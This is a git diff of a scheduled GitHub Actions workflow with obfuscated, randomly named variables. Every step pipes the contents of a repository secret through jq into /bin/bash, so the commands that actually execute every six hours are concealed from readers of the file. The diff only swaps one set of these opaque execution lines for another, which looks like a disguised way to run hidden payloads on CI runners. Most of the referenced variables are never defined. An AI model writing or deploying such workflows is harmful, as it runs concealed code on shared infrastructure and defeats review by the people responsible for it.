@@ -2,34 +2,24 @@ name: luxuejiao1988
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 1/6 * * *'
+    - cron: '12 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luxuejiao1988
         env:
-          gi610: ${{ secrets.gi610 }}
+          nonb0147: ${{ secrets.nonb0147 }}
         run: |
-          echo $gi610 | jq -r .nwjv412 | /bin/bash
-          echo $bn8 | jq -r .l678 | /bin/bash
-          echo $i63 | jq -r .zz346 | /bin/bash
-          echo $wwvlq9727 | jq -r .hhg3756 | /bin/bash
-          echo $m3 | jq -r .hgzj2 | /bin/bash
-          echo $sbth58398 | jq -r .zuofe40834 | /bin/bash
-          echo $ffx302 | jq -r .b1 | /bin/bash
-          echo $skwb7 | jq -r .sufc63 | /bin/bash
-          echo $bhs7846 | jq -r .aoi6 | /bin/bash
-          echo $kyunu6 | jq -r .uk6 | /bin/bash
-          echo $vxm0083 | jq -r .x3249 | /bin/bash
-          echo $h8 | jq -r .kw7074 | /bin/bash
-          echo $bfesx1 | jq -r .hn3514 | /bin/bash
-          echo $aowx3461 | jq -r .p9108 | /bin/bash
-          echo $dwgr92 | jq -r .smza65747 | /bin/bash
-          echo $qdpe2 | jq -r .uec7884 | /bin/bash
-          echo $jdfe7455 | jq -r .kqgee3901 | /bin/bash
-          echo $u7 | jq -r .xk36012 | /bin/bash
-          echo $gcv377 | jq -r .hrc381 | /bin/bash
+          echo $nonb0147 | jq -r .ds5396 | /bin/bash
+          echo $wwut9 | jq -r .ibq64841 | /bin/bash
+          echo $ybnxb7 | jq -r .srig35 | /bin/bash
+          echo $zyy36 | jq -r .fjno82032 | /bin/bash
+          echo $nm58486 | jq -r .gth62 | /bin/bash
+          echo $rvau22922 | jq -r .gjaj0012 | /bin/bash
+          echo $nd9038 | jq -r .nrsg0287 | /bin/bash
+          echo $of861 | jq -r .fn4 | /bin/bash
+          echo $gflt42334 | jq -r .ygh42 | /bin/bash
+          echo $h395 | jq -r .bqht4303 | /bin/bash
 
